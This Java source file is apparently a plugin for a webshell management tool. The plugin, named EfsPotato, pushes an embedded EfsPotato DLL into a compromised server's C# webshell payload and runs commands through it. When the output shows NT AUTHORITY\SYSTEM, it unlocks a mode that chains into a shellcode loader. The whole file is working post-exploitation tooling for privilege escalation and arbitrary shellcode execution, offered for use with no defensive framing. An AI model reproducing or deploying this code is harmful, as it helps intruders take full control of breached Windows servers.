package shells.plugins.cshap;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import shells.plugins.generic.ShellcodeLoader;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;





@PluginAnnotation(payloadName = "CShapDynamicPayload", Name = "EfsPotato", DisplayName = "EfsPotato")
public class EfsPotato
  extends ShellcodeLoader
{
  private static final String CLASS_NAME = "EfsPotato.EfsPotato";
  private final JPanel panel;
  private final JPanel mainPanel;
  private final JButton loadButton;
  private final JButton runButton;
  private final JTextField commandTextField;
  
  public EfsPotato() {
    this.panel = new JPanel(new BorderLayout());
    this.mainPanel = new JPanel(new BorderLayout());
    this.loadButton = new JButton("Load");
    this.runButton = new JButton("Run");
    this.commandTextField = new JTextField(35);
    this.resultTextArea = new RTextArea();
    this.splitPane = new JSplitPane();
    
    this.splitPane.setOrientation(0);
    this.splitPane.setDividerSize(0);
    
    JPanel topPanel = new JPanel();
    
    topPanel.add(this.loadButton);
    topPanel.add(this.commandTextField);
    topPanel.add(this.runButton);
    
    this.splitPane.setTopComponent(topPanel);
    this.splitPane.setBottomComponent(new JScrollPane((Component)this.resultTextArea));
    
    this.splitPane.addComponentListener(new ComponentAdapter()
        {
          public void componentResized(ComponentEvent e) {
            EfsPotato.this.splitPane.setDividerLocation(0.15D);
          }
        });
    
    this.panel.add(this.splitPane);
    
    this.commandTextField.setText("cmd /c whoami");
    this.mainPanel.add(this.panel);
  }
  private final JSplitPane splitPane; private final RTextArea resultTextArea; private boolean loadState; private ShellEntity shellEntity; private Payload payload; private Encoding encoding; private boolean superModel;
  
  public boolean load() {
    if (!this.loadState) {
      try {
        InputStream inputStream = getClass().getResourceAsStream("assets/EfsPotato.dll");
        byte[] data = functions.readInputStream(inputStream);
        inputStream.close();
        if (this.payload.include("EfsPotato.EfsPotato", data)) {
          this.loadState = true;
          return this.loadState;
        } 
        return false;
      }
      catch (Exception e) {
        Log.error(e);
      } 
    }
    
    return this.loadState;
  }

  
  public String getClassName() {
    return "EfsPotato.EfsPotato";
  }
  
  private void loadButtonClick(ActionEvent actionEvent) {
    if (load()) {
      GOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
    } else {
      GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
    } 
  }
  private void runButtonClick(ActionEvent actionEvent) {
    ReqParameter parameter = new ReqParameter();
    parameter.add("cmd", this.commandTextField.getText());
    byte[] result = this.payload.evalFunc("EfsPotato.EfsPotato", "run", parameter);
    
    this.resultTextArea.setText(this.encoding.Decoding(result));
    
    if (!this.superModel && result != null && this.encoding.Decoding(result).toUpperCase().indexOf("NT AUTHORITY\\SYSTEM") != -1) {
      this.superModel = true;
      this.mainPanel.remove(this.panel);
      this.mainPanel.add(super.getView());
      this.tabbedPane.addTab("EfsPotato", this.panel);
      this.tabbedPane.setSelectedIndex(this.tabbedPane.getTabCount() - 1);
      ShellcodeLoader loader = (ShellcodeLoader)this.shellEntity.getFrame().getPlugin("ShellcodeLoader");
      if (loader != null) {
        loader.childLoder = this;
      }
      GOptionPane.showMessageDialog(this.panel, "您是SYSTEM! 已升级到高级模式", "提示", 1);
    } 
  }


  
  public byte[] runShellcode(ReqParameter reqParameter, String command, byte[] shellcode, int readWait) {
    reqParameter.add("cmd", command);
    reqParameter.add("readWait", Integer.toString(readWait));
    return super.runShellcode(reqParameter, command, shellcode, readWait);
  }

  
  public void init(ShellEntity shellEntity) {
    super.init(shellEntity);
    this.shellEntity = shellEntity;
    this.payload = this.shellEntity.getPayloadModule();
    this.encoding = Encoding.getEncoding(this.shellEntity);
    automaticBindClick.bindJButtonClick(this, this);
  }



  
  public JPanel getView() {
    super.getView();
    return this.mainPanel;
  }
}
